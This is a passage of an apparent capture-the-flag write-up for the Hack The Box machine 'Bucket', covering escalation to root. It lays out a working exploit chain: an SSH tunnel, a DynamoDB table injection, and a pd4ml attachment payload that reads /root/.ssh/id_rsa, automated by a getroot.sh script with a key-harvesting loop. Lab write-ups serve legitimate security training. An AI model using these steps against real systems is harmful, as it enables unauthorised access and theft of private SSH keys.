</span></span><span class="line"><span class="cl">  Usage of /:                       33.8% of 17.59GB
</span></span><span class="line"><span class="cl">  Memory usage:                     29%
</span></span><span class="line"><span class="cl">  Swap usage:                       0%
</span></span><span class="line"><span class="cl">  Processes:                        <span class="m">252</span>
</span></span><span class="line"><span class="cl">  Users logged in:                  <span class="m">0</span>
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> br-bee97070fb20: 172.18.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160:          10.10.10.212
</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> ens160:          dead:beef::250:56ff:feb9:df48
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">roy@bucket:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span>,1001<span class="o">(</span>sysadm<span class="o">)</span>
</span></span><span class="line"><span class="cl">roy@bucket:~$ 
</span></span></code></pre></div><p>The user flag is done here.</p>
<p><div class="img-container"><img src="imgs/image-20210423013951765.png" alt="image-20210423013951765"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Running WinPEAS discovers another service currently running on port 8000.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Active Ports
</span></span><span class="line"><span class="cl">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       0      0 :::80                   :::*                    LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      - 
</span></span></code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Readable files belonging to root and readable by me but not world readable
</span></span><span class="line"><span class="cl">-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
</span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
</span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
</span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
</span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
</span></span></code></pre></div><p>I can list the contents inside <code>bucket-app</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">856</span>
</span></span><span class="line"><span class="cl">drwxr-x---+  <span class="m">4</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 .
</span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">4</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 ..
</span></span><span class="line"><span class="cl">-rw-r-x---+  <span class="m">1</span> root root     <span class="m">63</span> Sep <span class="m">23</span>  <span class="m">2020</span> composer.json
</span></span><span class="line"><span class="cl">-rw-r-x---+  <span class="m">1</span> root root  <span class="m">20533</span> Sep <span class="m">23</span>  <span class="m">2020</span> composer.lock
</span></span><span class="line"><span class="cl">drwxr-x---+  <span class="m">2</span> root root   <span class="m">4096</span> Apr <span class="m">22</span> 12:38 files
</span></span><span class="line"><span class="cl">-rwxr-x---+  <span class="m">1</span> root root  <span class="m">17222</span> Sep <span class="m">23</span>  <span class="m">2020</span> index.php
</span></span><span class="line"><span class="cl">-rwxr-x---+  <span class="m">1</span> root root <span class="m">808729</span> Jun <span class="m">10</span>  <span class="m">2020</span> pd4ml_demo.jar
</span></span><span class="line"><span class="cl">drwxr-x---+ <span class="m">10</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 vendor
</span></span></code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;VirtualHost</span> <span class="err">127.0.0.1:8000</span><span class="nt">&gt;</span> # unknown
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;IfModule</span> <span class="err">mpm_itk_module</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                AssignUserId root root
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/IfModule&gt;</span>
</span></span><span class="line"><span class="cl">        DocumentRoot /var/www/bucket-app
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/VirtualHost&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span> # bucket.htb
</span></span><span class="line"><span class="cl">        DocumentRoot /var/www/html
</span></span><span class="line"><span class="cl">        RewriteEngine On
</span></span><span class="line"><span class="cl">        RewriteCond %{HTTP_HOST} !^bucket.htb$
</span></span><span class="line"><span class="cl">        RewriteRule /.* http://bucket.htb/ [R]
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/VirtualHost&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span> # s3.bucket.htb 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        ProxyPreserveHost on
</span></span><span class="line"><span class="cl">        ProxyPass / http://localhost:4566/
</span></span><span class="line"><span class="cl">        ProxyPassReverse / http://localhost:4566/
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Proxy</span> <span class="err">*</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                 Order deny,allow
</span></span><span class="line"><span class="cl">                 Allow from all
</span></span><span class="line"><span class="cl">         <span class="nt">&lt;/Proxy&gt;</span>
</span></span><span class="line"><span class="cl">        ServerAdmin webmaster@localhost
</span></span><span class="line"><span class="cl">        ServerName s3.bucket.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span><span class="line"><span class="cl">        CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/VirtualHost&gt;</span>
</span></span></code></pre></div><h4 id="internal-web">Internal Web</h4>
<p>I&rsquo;ll expose the internal web to my localhost on the same port with SSH tunnel.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ ~C
</span></span><span class="line"><span class="cl">ssh&gt; -L 8000:127.0.0.1:8000
</span></span><span class="line"><span class="cl">Forwarding port.
</span></span><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$
</span></span></code></pre></div><p>The website page says the site is under construction.</p>
<p><div class="img-container"><img src="imgs/image-20210423015905604.png" alt="image-20210423015905604"  /></div>
</p>
<h4 id="source-code-review">Source Code Review</h4>
<p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ cat index.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">use Aws<span class="se">\D</span>ynamoDb<span class="se">\D</span>ynamoDbClient<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="o">]===</span><span class="s2">&#34;POST&#34;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&#34;action&#34;</span><span class="o">]===</span><span class="s2">&#34;get_alerts&#34;</span><span class="o">)</span> <span class="o">{</span> <span class="c1"># POST action=get_alerts </span>
</span></span><span class="line"><span class="cl">                date_default_timezone_set<span class="o">(</span><span class="s1">&#39;America/New_York&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$client</span> <span class="o">=</span> new DynamoDbClient<span class="o">([</span>  <span class="c1"># Connect to DynamoDB.</span>
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;profile&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;default&#39;</span>,
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;region&#39;</span>  <span class="o">=</span>&gt; <span class="s1">&#39;us-east-1&#39;</span>,
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;version&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;latest&#39;</span>,
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;endpoint&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;http://localhost:4566&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span>-&gt;getIterator<span class="o">(</span><span class="s1">&#39;Scan&#39;</span>, array<span class="o">(</span> <span class="c1"># Read content from table alerts</span>
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;TableName&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;alerts&#39;</span>,
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;FilterExpression&#39;</span> <span class="o">=</span>&gt; <span class="s2">&#34;title = :title&#34;</span>, <span class="c1"># Filter by title</span>
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;ExpressionAttributeValues&#39;</span> <span class="o">=</span>&gt; array<span class="o">(</span><span class="s2">&#34;:title&#34;</span><span class="o">=</span>&gt;array<span class="o">(</span><span class="s2">&#34;S&#34;</span><span class="o">=</span>&gt;<span class="s2">&#34;Ransomware&#34;</span><span class="o">))</span>,
</span></span><span class="line"><span class="cl">                <span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                foreach <span class="o">(</span><span class="nv">$iterator</span> as <span class="nv">$item</span><span class="o">)</span> <span class="o">{</span>  <span class="c1"># </span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$name</span><span class="o">=</span>rand<span class="o">(</span>1,10000<span class="o">)</span>.<span class="s1">&#39;.html&#39;</span><span class="p">;</span> <span class="c1"># Generate randomnumber.html </span>
</span></span><span class="line"><span class="cl">                        file_put_contents<span class="o">(</span><span class="s1">&#39;files/&#39;</span>.<span class="nv">$name</span>,<span class="nv">$item</span><span class="o">[</span><span class="s2">&#34;data&#34;</span><span class="o">])</span><span class="p">;</span> <span class="c1"># Write contents to randomnumber.html</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                passthru<span class="o">(</span><span class="s2">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf&#34;</span><span class="o">)</span><span class="p">;</span> <span class="c1"># convert randomnumber.html to result.pdf</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>When there is a POST request contains data of <code>action=get_alerts</code>, the following snippet creates a connection to DynamoDB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;action&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;get_alerts&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># POST action=get_alerts 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">date_default_timezone_set</span><span class="p">(</span><span class="s1">&#39;America/New_York&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DynamoDbClient</span><span class="p">([</span>  <span class="c1"># Connect to DynamoDB.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="s1">&#39;profile&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;default&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;region&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;us-east-1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;latest&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;endpoint&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;http://localhost:4566&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="p">]);</span>
</span></span></code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
<blockquote>
<p>DynamoDB is key-value NoSQL database.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="na">getIterator</span><span class="p">(</span><span class="s1">&#39;Scan&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="c1"># Read content from table alerts
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="s1">&#39;TableName&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;alerts&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">       <span class="s1">&#39;FilterExpression&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;title = :title&#34;</span><span class="p">,</span> <span class="c1"># Filter by title
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="s1">&#39;ExpressionAttributeValues&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;:title&#34;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;S&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;Ransomware&#34;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl"><span class="p">));</span>
</span></span></code></pre></div><p>For each result from the previous snippet, it writes the result value (<code>$item[“data”]</code>) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>  <span class="c1"># 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$name</span><span class="o">=</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.html&#39;</span><span class="p">;</span> <span class="c1"># Generate randomnumber.html 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;files/&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]);</span> <span class="c1"># Write contents to randomnumber.html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="si">$name</span><span class="s2"> 800 A4 -out files/result.pdf&#34;</span><span class="p">);</span> <span class="c1"># convert randomnumber.html to result.pdf
</span></span></span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
<p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read).</p>
<blockquote>
<p>*The web application is currently running as root</p>
</blockquote>
<h4 id="obtain-root-ssh-key">Obtain root SSH Key</h4>
<p>First I’ll try to create a dummy table on the database. I’ll be using JSON format and save it to a file called <code>test-table.json</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;TableName&#34;</span><span class="p">:</span> <span class="s2">&#34;iamf&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;AttributeDefinitions&#34;</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">	<span class="p">[</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span> <span class="nt">&#34;AttributeName&#34;</span><span class="p">:</span> <span class="s2">&#34;Name&#34;</span><span class="p">,</span> <span class="nt">&#34;AttributeType&#34;</span> <span class="p">:</span> <span class="s2">&#34;S&#34;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">],</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;KeySchema&#34;</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">	<span class="p">[</span> 
</span></span><span class="line"><span class="cl">		<span class="p">{</span> <span class="nt">&#34;AttributeName&#34;</span><span class="p">:</span> <span class="s2">&#34;Name&#34;</span><span class="p">,</span> <span class="nt">&#34;KeyType&#34;</span> <span class="p">:</span> <span class="s2">&#34;HASH&#34;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">],</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;ProvisionedThroughput&#34;</span> <span class="p">:</span> 
</span></span><span class="line"><span class="cl">		<span class="p">{</span> <span class="nt">&#34;WriteCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="nt">&#34;ReadCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">10</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and supply the JSON file on it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;TableDescription&#34;</span>: <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;AttributeDefinitions&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">            <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;AttributeName&#34;</span>: <span class="s2">&#34;Name&#34;</span>,
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;AttributeType&#34;</span>: <span class="s2">&#34;S&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">]</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;TableName&#34;</span>: <span class="s2">&#34;iamf&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;KeySchema&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">            <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;AttributeName&#34;</span>: <span class="s2">&#34;Name&#34;</span>,
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;KeyType&#34;</span>: <span class="s2">&#34;HASH&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">]</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;TableStatus&#34;</span>: <span class="s2">&#34;ACTIVE&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;CreationDateTime&#34;</span>: <span class="s2">&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Using the subcommand <code>list-tables</code>, I can confirm that the table has been created. I also notice that I can insert items into this table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;TableNames&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;iamf&#34;</span>,
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;users&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
<p><code>alert-table.json</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;TableName&#34;</span><span class="p">:</span> <span class="s2">&#34;alerts&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;AttributeDefinitions&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span><span class="nt">&#34;AttributeName&#34;</span><span class="p">:</span> <span class="s2">&#34;title&#34;</span><span class="p">,</span> <span class="nt">&#34;AttributeType&#34;</span> <span class="p">:</span> <span class="s2">&#34;S&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span><span class="nt">&#34;AttributeName&#34;</span><span class="p">:</span> <span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="nt">&#34;AttributeType&#34;</span> <span class="p">:</span> <span class="s2">&#34;S&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;KeySchema&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span><span class="nt">&#34;AttributeName&#34;</span><span class="p">:</span> <span class="s2">&#34;title&#34;</span><span class="p">,</span> <span class="nt">&#34;KeyType&#34;</span> <span class="p">:</span> <span class="s2">&#34;HASH&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span><span class="nt">&#34;AttributeName&#34;</span><span class="p">:</span> <span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="nt">&#34;KeyType&#34;</span> <span class="p">:</span> <span class="s2">&#34;RANGE&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;ProvisionedThroughput&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nt">&#34;WriteCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="nt">&#34;ReadCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">10</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm">source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p>
<p><code>payload.json</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;Ransomware&#34;</span> <span class="p">},</span> 
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
<p><code>getroot.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Create table&#34;</span>
</span></span><span class="line"><span class="cl">aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span class="o">=</span>http://s3.bucket.htb &gt;/dev/null
</span></span><span class="line"><span class="cl">sleep 0.5
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Insert item&#34;</span>
</span></span><span class="line"><span class="cl">aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span class="o">=</span>http://s3.bucket.htb &gt;/dev/null
</span></span><span class="line"><span class="cl">sleep 0.5
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Send get alerts&#34;</span>
</span></span><span class="line"><span class="cl">curl -svd <span class="s2">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span class="c1"># The port 8000 on Bucket forwarded to localhost:8000</span>
</span></span></code></pre></div><blockquote>
<p>The script assume all the required files are stored in the same folder.</p>
</blockquote>
<p>I’ll watch the <code>result.pdf</code> at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app/files$ <span class="k">while</span> sleep 2<span class="p">;</span> <span class="k">do</span> sed -n <span class="s1">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
</span></span><span class="line"><span class="cl">$ ./getroot.sh  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Create table
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Insert item
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Send get alerts
</span></span><span class="line"><span class="cl">*   Trying 127.0.0.1:8000...
</span></span><span class="line"><span class="cl">* TCP_NODELAY <span class="nb">set</span>
